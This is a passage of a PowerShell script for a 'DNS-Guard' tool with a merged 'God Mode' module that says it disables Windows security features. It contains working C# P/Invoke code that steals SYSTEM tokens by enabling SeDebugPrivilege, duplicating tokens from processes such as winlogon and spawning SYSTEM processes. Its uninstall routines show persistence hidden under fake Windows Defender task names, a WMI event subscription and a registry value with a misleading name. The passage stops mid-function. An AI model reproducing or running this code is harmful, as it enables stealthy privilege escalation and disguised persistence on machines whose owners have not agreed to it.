            $Result = Invoke-AsSystem -Command $SystemCmd
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $GodModeInstallDir. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $GodModeInstallDir) {
            Write-Log -Message "SYSTEM cleanup failed: $GodModeInstallDir still exists." -Type "ERROR" -Color Red
            if (Test-Path $GodModeInstallScript) {
                Write-Log -Message "GodMode.ps1 still exists inside install dir." -Type "ERROR" -Color Red
            }
        } else {
            Write-Log -Message "God Mode directory removed." -Type "INFO" -Color Gray
        }
    }

    # Final verification
    $FailedCount = 0
    if (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GodModeTaskName still exists." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $GodModeGuardianName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Guardian $GodModeGuardianName still exists." -Type "ERROR" -Color Red }
    if (Test-Path $GodModeInstallDir) { $FailedCount++; Write-Log -Message "Install dir $GodModeInstallDir still exists." -Type "ERROR" -Color Red }
    if (Test-Path $GodModeCmdPath) { $FailedCount++; Write-Log -Message "CLI $GodModeCmdPath still exists." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -like "*$GodModeInstallDir*") { $FailedCount++; Write-Log -Message "PATH still contains $GodModeInstallDir." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "`n[SUCCESS] GOD MODE UNINSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
    }
    Write-DebugLog -FunctionName "Uninstall-GodModePersistence" -Action "EXIT" -Message "Complete"
}

function Uninstall-Persistence {
    # Exit early if nothing is installed
    $IsInstalled = (Test-Path $InstallDir) -or (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
    if (-not $IsInstalled) {
        Write-Host "[WARN] DNS-Guard is not installed. Nothing to uninstall." -ForegroundColor Yellow
        return
    }

    Write-Log -Message "Uninstalling DNS-Guard from System..." -Type "ACTION" -Color Yellow

    # GPO registry cleanup is handled by Disable-DNSLock; no separate ACL relaxation needed

    # Unlock the network FIRST (so it can safely write to the log file)
    Disable-DNSLock

    # Remove the Scheduled Tasks (including both guardians)
    $GuardianTaskName = "Windows-Defender-Platform-Update"
    $Guardian2Name = "Windows-Defender-AM-Updates"
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed Background Task: $TaskName" -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $GuardianTaskName -Confirm:$false | Out-Null
        Write-Log -Message "Removed Guardian 1: $GuardianTaskName" -Type "INFO" -Color Gray
    }
    if (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $Guardian2Name -Confirm:$false | Out-Null
        Write-Log -Message "Removed Guardian 2: $Guardian2Name" -Type "INFO" -Color Gray
    }

    # Remove WMI Event Subscription
    Write-Log -Message "Removing WMI event subscription..." -Type "INFO" -Color Gray
    try {
        Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Class __FilterToConsumerBinding -Namespace "root\subscription" -Filter "__PATH LIKE '%WindowsUpdateHealthCheck%'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Failed to remove WMI subscription: $_" -Type "WARN" -Color Yellow }
    
    # Remove the integrity hash registry key
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    if (Test-Path $IntegrityRegPath) {
        Remove-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction SilentlyContinue
    }

    # Remove Global CLI Command (relax ACL first) - then delete via SYSTEM helper if needed
    if (Test-Path $CmdPath) {
        try {
            $CmdAcl = Get-Acl -Path $CmdPath
            $CurrentUserSid = [Security.Principal.WindowsIdentity]::GetCurrent().User
            $CmdAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($CurrentUserSid, "FullControl", "None", "None", "Allow")))
            Set-Acl -Path $CmdPath -AclObject $CmdAcl -ErrorAction Stop
            Remove-Item -Path $CmdPath -Force -ErrorAction Stop
        } catch {
            Write-Log -Message "Direct deletion failed for $CmdPath. Spawning SYSTEM cleanup task..." -Type "INFO" -Color Yellow
            $Result = Invoke-AsSystem -Command "takeown.exe /F `"$CmdPath`" & icacls.exe `"$CmdPath`" /reset & cmd /c del /f /q `"$CmdPath`""
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $CmdPath. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
        }
        if (Test-Path $CmdPath) {
            Write-Log -Message "Failed to remove 'dnslock' CLI Alias at $CmdPath." -Type "ERROR" -Color Red
        } else {
            Write-Log -Message "Removed 'dnslock' CLI Alias." -Type "INFO" -Color Gray
        }
    }

    # Remove local wrapper and PATH entry
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    if (Test-Path $CmdPathLocal) { Remove-Item -Path $CmdPathLocal -Force -ErrorAction SilentlyContinue }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
        if ($CurrentPath -like "*$InstallDir*") {
            $NewPath = ($CurrentPath -split ';' | Where-Object { $_ -ne $InstallDir }) -join ';'
            [Environment]::SetEnvironmentVariable("PATH", $NewPath, "Machine")
            Write-Log -Message "Removed $InstallDir from system PATH." -Type "INFO" -Color Gray
        }
    } catch {
        Write-Log -Message "Failed to clean system PATH: $_" -Type "ERROR" -Color Red
    }
    
    # Delete System Directory LAST - use SYSTEM helper if direct deletion fails (hardened ACLs)
    if (Test-Path $InstallDir) {
        Write-Log -Message "Removing hardened installation directory..." -Type "INFO" -Color Gray
        # Explicitly delete the installed script file first (bypass ACLs via cmd)
        if (Test-Path $InstallScript) {
            cmd /c "del /f /q `"$InstallScript`"" | Out-Null
        }
        try {
            Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction Stop
            Write-Log -Message "Installation directory removed." -Type "INFO" -Color Gray
        } catch {
            Write-Log -Message "Direct deletion failed (hardened ACLs). Spawning SYSTEM cleanup task..." -Type "INFO" -Color Yellow
            $SystemCmd = "takeown /F `"$InstallDir`" /R /D Y & icacls `"$InstallDir`" /reset /T /C /Q & cmd /c rd /s /q `"$InstallDir`" 2>nul"
            $Result = Invoke-AsSystem -Command $SystemCmd
            if (-not $Result.Success) {
                Write-Log -Message "SYSTEM cleanup failed for $InstallDir. Output: $($Result.Output)" -Type "ERROR" -Color Red
            }
            if (Test-Path $InstallDir) {
                Write-Log -Message "SYSTEM cleanup failed: $InstallDir still exists." -Type "ERROR" -Color Red
                Write-Log -Message "[DEBUG] Directory contents: $(Get-ChildItem -Path $InstallDir -Force | Select-Object Name | Out-String)" -Type "ERROR" -Color Red
            } else {
                Write-Log -Message "Installation directory removed by SYSTEM. Goodbye!" -Type "INFO" -Color Gray
            }
        }
    }

    # Final status verification: check if any artifacts still remain
    $FailedCount = 0
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $TaskName still exists after uninstall." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $GuardianTaskName -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $GuardianTaskName still exists after uninstall." -Type "ERROR" -Color Red }
    if (Get-ScheduledTask -TaskName $Guardian2Name -ErrorAction SilentlyContinue) { $FailedCount++; Write-Log -Message "Task $Guardian2Name still exists after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $InstallDir) { $FailedCount++; Write-Log -Message "Install directory $InstallDir still exists after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $CmdPath) { $FailedCount++; Write-Log -Message "Global CLI $CmdPath still exists after uninstall." -Type "ERROR" -Color Red }
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    if (Test-Path $CmdPathLocal) { $FailedCount++; Write-Log -Message "Local wrapper $CmdPathLocal still exists after uninstall." -Type "ERROR" -Color Red }
    $CurrentPath = [Environment]::GetEnvironmentVariable("PATH", "Machine")
    if ($CurrentPath -like "*$InstallDir*") { $FailedCount++; Write-Log -Message "System PATH still contains $InstallDir after uninstall." -Type "ERROR" -Color Red }
    if (Test-Path $IntegrityRegPath) { Write-Log -Message "Registry key $IntegrityRegPath still exists after uninstall." -Type "WARN" -Color Yellow }
    $WmiFilter = Get-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if ($WmiFilter) { Write-Log -Message "WMI event filter still exists after uninstall." -Type "WARN" -Color Yellow }
    $WmiConsumer = Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" -Filter "Name='WindowsUpdateHealthCheck'" -ErrorAction SilentlyContinue
    if ($WmiConsumer) { Write-Log -Message "WMI event consumer still exists after uninstall." -Type "WARN" -Color Yellow }

    if ($FailedCount -eq 0) {
        Write-Host "`n[SUCCESS] UNINSTALLATION COMPLETE!" -ForegroundColor Green
    } else {
        Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed to remove)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 7. GOD MODE MODULE (MERGED FROM God mode.ps1)
# ============================================================================
# WARNING: These functions disable Windows security features and are extremely
# dangerous. Only the Built-in Administrator account may use them.
# ============================================================================

function Test-BuiltInAdmin {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    # Allow both Built-in Administrator (SID ending in -500) and SYSTEM (S-1-5-18)
    return ($sid -like "*-500" -or $sid -eq "S-1-5-18")
}

function Test-SystemContext {
    Write-Host "`n[VERIFY] Running whoami as SYSTEM..." -ForegroundColor Cyan
    $Result = Invoke-AsSystem -Command "whoami & whoami /groups"
    if ($Result.Success -and $Result.Output) {
        Write-Host "[SUCCESS] SYSTEM context verified:" -ForegroundColor Green
        Write-Host $Result.Output -ForegroundColor Green
    } else {
        Write-Host "[FAIL] Could not verify SYSTEM context." -ForegroundColor Red
        if ($Result.Output) { Write-Host "Output: $($Result.Output)" -ForegroundColor Yellow }
    }
    Write-Host "`n[NOTE] Your current session runs as Administrator. God Mode does not change your user account." -ForegroundColor DarkGray
    Write-Host "       The SYSTEM context is only used for background tasks and hardened cleanup operations." -ForegroundColor DarkGray
}

function Get-CurrentUserSidInfo {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    $isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $adminCheck = $isAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    return [PSCustomObject]@{ SID = $sid; IsAdmin = $adminCheck; IsBuiltInAdmin = ($sid -like "*-500") }
}

# --- Hybrid Token Stealing Elevation (Option 7 Enhancement) ---
# Adds C# P/Invoke to duplicate a SYSTEM token from a running process and spawn
# a new process with it. Falls back to scheduled-task elevation if token stealing fails.
# This makes God Mode robust across different Windows builds where SYSTEM processes vary.

$TokenOpsType = @"
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public class TokenOps {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
    public const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    public const uint PROCESS_VM_READ = 0x0010;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_ALL_ACCESS = 0xF01FF;

    public const int SecurityImpersonation = 2;
    public const int SecurityIdentification = 1;
    public const int TokenPrimary = 1;
    public const int TokenImpersonation = 2;

    public const int LOGON_WITH_PROFILE = 1;
    public const int LOGON_NETCREDENTIALS_ONLY = 2;

    public const uint CREATE_NEW_CONSOLE = 0x00000010;
    public const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
    public const uint CREATE_NO_WINDOW = 0x08000000;

    public const string SE_DEBUG_NAME = "SeDebugPrivilege";
    public const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
    public const string SE_IMPERSONATE_NAME = "SeImpersonatePrivilege";

    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static bool EnablePrivilege(string privilegeName) {
        IntPtr hToken = IntPtr.Zero;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) {
            return false;
        }
        try {
            LUID luid;
            if (!LookupPrivilegeValue(null, privilegeName, out luid)) return false;
            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES {
                PrivilegeCount = 1,
                Privileges = new LUID_AND_ATTRIBUTES[3]
            };
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            bool ok = AdjustTokenPrivileges(hToken, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
            int err = Marshal.GetLastWin32Error();
            return ok && err == 0;
        } finally {
            CloseHandle(hToken);
        }
    }

    public static bool TestOpenProcess(int pid) {
        IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
        if (hProcess == IntPtr.Zero) return false;
        try {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) return false;
            try {
                IntPtr hDupToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken)) return false;
                CloseHandle(hDupToken);
                return true;
            } finally {
                CloseHandle(hToken);
            }
        } finally {
            CloseHandle(hProcess);
        }
    }

    public static int CreateProcessFromToken(int pid, string appName, string cmdLine, bool hideWindow) {
        IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
        if (hProcess == IntPtr.Zero) return Marshal.GetLastWin32Error();
        try {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) {
                return Marshal.GetLastWin32Error();
            }
            try {
                IntPtr hDupToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken)) {
                    return Marshal.GetLastWin32Error();
                }
                try {
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = "WinSta0\\Default";
                    if (hideWindow) {
                        si.dwFlags = 0x00000001;
                        si.wShowWindow = 0;
                    }
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    uint creationFlags = CREATE_UNICODE_ENVIRONMENT;
                    if (hideWindow) creationFlags |= CREATE_NO_WINDOW;
                    else creationFlags |= CREATE_NEW_CONSOLE;

                    string app = appName;
                    string cmd = cmdLine;
                    if (string.IsNullOrEmpty(cmd)) { cmd = appName; }

                    if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, app, cmd, creationFlags, IntPtr.Zero, null, ref si, out pi)) {
                        return Marshal.GetLastWin32Error();
                    }
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return 0;
                } finally {
                    CloseHandle(hDupToken);
                }
            } finally {
                CloseHandle(hToken);
            }
        } finally {
            CloseHandle(hProcess);
        }
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetThreadToken(IntPtr ThreadHandle, IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, ref int TokenInformation, int TokenInformationLength);

    public const int TokenSessionId = 12;

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    public static int CreateProcessAsSystem(int pid, string appName, string cmdLine, bool hideWindow) {
        IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
        if (hProcess == IntPtr.Zero) return Marshal.GetLastWin32Error();
        try {
            IntPtr hToken = IntPtr.Zero;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, out hToken)) {
                return Marshal.GetLastWin32Error();
            }
            try {
                IntPtr hPrimaryToken = IntPtr.Zero;
                if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hPrimaryToken)) {
                    return Marshal.GetLastWin32Error();
                }
                try {
                    int sessionId = 1;
                    SetTokenInformation(hPrimaryToken, TokenSessionId, ref sessionId, 4);
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = "WinSta0\\Default";
                    if (hideWindow) {
                        si.dwFlags = 0x00000001;
                        si.wShowWindow = 0;
                    }
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    uint creationFlags = CREATE_UNICODE_ENVIRONMENT;
                    if (hideWindow) creationFlags |= CREATE_NO_WINDOW;
                    else creationFlags |= CREATE_NEW_CONSOLE;
                    if (!CreateProcessAsUser(hPrimaryToken, appName, cmdLine, IntPtr.Zero, IntPtr.Zero, false, creationFlags, IntPtr.Zero, null, ref si, out pi)) {
                        return Marshal.GetLastWin32Error();
                    }
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return 0;
                } finally {
                    CloseHandle(hPrimaryToken);
                }
            } finally {
                CloseHandle(hToken);
            }
        } finally {
            CloseHandle(hProcess);
        }
    }
}
"@

try {
    Add-Type -TypeDefinition $TokenOpsType -ErrorAction Stop
} catch {
    Write-Log -Message "TokenOps P/Invoke already loaded or compilation failed: $_" -Type "WARN" -Color Yellow
}

$script:__ElevPrivWarned = $false

function Enable-ElevationPrivileges {
    $privResults = @()
    $required = @("SeDebugPrivilege", "SeAssignPrimaryTokenPrivilege", "SeImpersonatePrivilege")
    foreach ($privName in $required) {
        try {
            $rc = [TokenOps]::EnablePrivilege($privName)
            $privResults += [PSCustomObject]@{ Name = $privName; Result = $rc }
            if (-not $rc) {
                $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $rootCause = Get-Win32ErrorRootCause -ErrorCode $err -Context "general"
                Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "ERROR" -Message "Failed to enable $privName | Win32=$err" -RootCause $rootCause
                Write-Log -Message "Privilege fail: $privName -> $rootCause" -Type "WARN" -Color Yellow
            } else {
                Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "INFO" -Message "$privName enabled successfully"
            }
        } catch {
            Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "ERROR" -Message "Exception enabling $privName | $($_.Exception.Message)" -ErrorRecord $_
        }
    }
    $missing = ($privResults | Where-Object { -not $_.Result }).Name
    if ($missing) {
        if (-not $script:__ElevPrivWarned) {
            $script:__ElevPrivWarned = $true
            Write-Log -Message "CRITICAL: Missing required privileges: $missing. Token stealing will likely fail. Exporting diagnostics..." -Type "ERROR" -Color Red
            Export-ElevationDiagnostics -Trigger "MissingPrivileges"
        } else {
            Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "INFO" -Message "Missing privileges already warned once this session: $missing"
        }
    } else {
        Write-DebugLog -FunctionName "Enable-ElevationPrivileges" -Action "EXIT" -Message "All required privileges enabled. Results: $($privResults | ConvertTo-Json -Compress)"
    }
}

function Find-SystemProcessCandidate {
    param([int]$MaxScan = 30)
    $allProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    if (-not $allProcs) {
        Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "ERROR" -Message "Get-CimInstance Win32_Process returned nothing. WMI may be broken or restricted."
        return 0
    }

    $diagnostics = @()
    $diagnostics += "Scan started. Total processes: $($allProcs.Count)"

    $session1Names = @("winlogon.exe","dwm.exe","fontdrvhost.exe")
    foreach ($name in $session1Names) {
        $candidates = $allProcs | Where-Object { $_.Name -eq $name -and $_.SessionId -eq 1 }
        foreach ($proc in $candidates) {
            try {
                $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
                if ($owner -eq "SYSTEM") {
                    $test = [TokenOps]::TestOpenProcess($proc.ProcessId)
                    if ($test) {
                        $diagnostics += "SUCCESS: Selected Session 1 SYSTEM process: $($proc.Name) PID=$($proc.ProcessId)"
                        Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "INFO" -Message ($diagnostics -join " | ")
                        return $proc.ProcessId
                    } else {
                        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        $rc = Get-Win32ErrorRootCause -ErrorCode $err -Context "OpenProcess"
                        $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=1 Owner=SYSTEM | TestOpenProcess failed | $rc"
                    }
                } else {
                    $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=1 Owner=$owner (not SYSTEM)"
                }
            } catch {
                $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=1 | WMI GetOwner exception: $($_.Exception.Message)"
            }
        }
    }

    $excludeNames = @("System","Registry","smss.exe","csrss.exe","wininit.exe","lsass.exe","MsMpEng.exe")
    $scanned = 0
    foreach ($proc in ($allProcs | Where-Object { $_.ProcessId -gt 4 -and $_.Name -notin $excludeNames } | Sort-Object { $_.SessionId } -Descending)) {
        if ($scanned -ge $MaxScan) { break }
        $scanned++
        try {
            $owner = ($proc | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue).User
            if ($owner -eq "SYSTEM") {
                $test = [TokenOps]::TestOpenProcess($proc.ProcessId)
                if ($test) {
                    $diagnostics += "SUCCESS: Selected fallback SYSTEM process: $($proc.Name) PID=$($proc.ProcessId) Session=$($proc.SessionId)"
                    Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "INFO" -Message ($diagnostics -join " | ")
                    return $proc.ProcessId
                } else {
                    $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    $rc = Get-Win32ErrorRootCause -ErrorCode $err -Context "OpenProcess"
                    $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=$($proc.SessionId) Owner=SYSTEM | TestOpenProcess failed | $rc"
                }
            } else {
                $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) Session=$($proc.SessionId) Owner=$owner (not SYSTEM)"
            }
        } catch {
            $diagnostics += "REJECTED: $($proc.Name) PID=$($proc.ProcessId) | WMI GetOwner exception: $($_.Exception.Message)"
        }
    }
    Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "ERROR" -Message "No usable SYSTEM process found after $scanned scans. Details: $($diagnostics -join ' | ')" -RootCause "All SYSTEM candidates rejected due to PPL protection, missing privileges, or session mismatch. Check Export-ElevationDiagnostics dump."
    Export-ElevationDiagnostics -Trigger "NoSystemProcessCandidate"
    return 0
}

function Start-ProcessWithStolenToken {
    param(
        [string]$Path,
        [string]$Arguments = "",
        [switch]$HideWindow
    )
    try {
        Enable-ElevationPrivileges
        $systemPid = Find-SystemProcessCandidate
        if ($systemPid -eq 0) {
            $rootCause = "No accessible SYSTEM process found. Either all SYSTEM processes are PPL-protected, current token lacks SeDebugPrivilege, or no SYSTEM processes are running."
            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "Find-SystemProcessCandidate returned 0" -RootCause $rootCause
            return $false
        }
        $cmd = "`"$Path`""
        if ($Arguments) { $cmd += " $Arguments" }
        Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "INFO" -Message "Attempting token steal from PID=$systemPid for target=$Path"
        $result = [TokenOps]::CreateProcessFromToken($systemPid, $Path, $cmd, [bool]$HideWindow)
        if ($result -eq 0) {
            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "EXIT" -Message "Success PID=$systemPid spawned=$Path"
            return $true
        } else {
            $errMsg = Get-Win32ErrorRootCause -ErrorCode $result -Context "CreateProcessWithTokenW"
            $rootCause = "Win32 error $result during CreateProcessWithTokenW. $errMsg"
            Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "Failed to spawn $Path from PID=$systemPid | Error=$result" -RootCause $rootCause
            Write-Log -Message "Token-steal failed: $errMsg (PID=$systemPid)" -Type "WARN" -Color Yellow
            if ($result -eq 5 -or $result -eq 87 -or $result -eq 1307) {
                $ctx = Get-ProcessElevationContext -ProcessId $systemPid
                Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "INFO" -Message "Source process context: Session=$($ctx.SessionId), Name=$($ctx.Name), CanDup=$($ctx.CanDuplicate). If Session=0, GUI apps will be invisible. Session 1 SYSTEM processes are required for visible desktop apps."
            }
            return $false
        }
    } catch {
        Write-DebugLog -FunctionName "Start-ProcessWithStolenToken" -Action "ERROR" -Message "Unhandled exception: $($_.Exception.Message)" -ErrorRecord $_
        return $false
    }
}

$script:__SystemImpersonationToken = [IntPtr]::Zero
$script:__SystemImpersonationActive = $false

function Enable-SystemImpersonation {
    try {
        $systemPid = Find-SystemProcessCandidate
        if ($systemPid -eq 0) {
            Write-Host "[ERROR] No accessible SYSTEM process found for token theft." -ForegroundColor Red
            return $false
        }
        $hProcess = [TokenOps]::OpenProcess([TokenOps]::PROCESS_QUERY_LIMITED_INFORMATION, $false, $systemPid)
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Host "[ERROR] Failed to open SYSTEM process PID=$systemPid." -ForegroundColor Red
            return $false
        }
        try {
            $hToken = [IntPtr]::Zero
            if (-not [TokenOps]::OpenProcessToken($hProcess, [TokenOps]::TOKEN_DUPLICATE -bor [TokenOps]::TOKEN_QUERY, [ref]$hToken)) {
                Write-Host "[ERROR] Failed to open process token for PID=$systemPid." -ForegroundColor Red
                return $false
            }
            try {
                $hImpToken = [IntPtr]::Zero
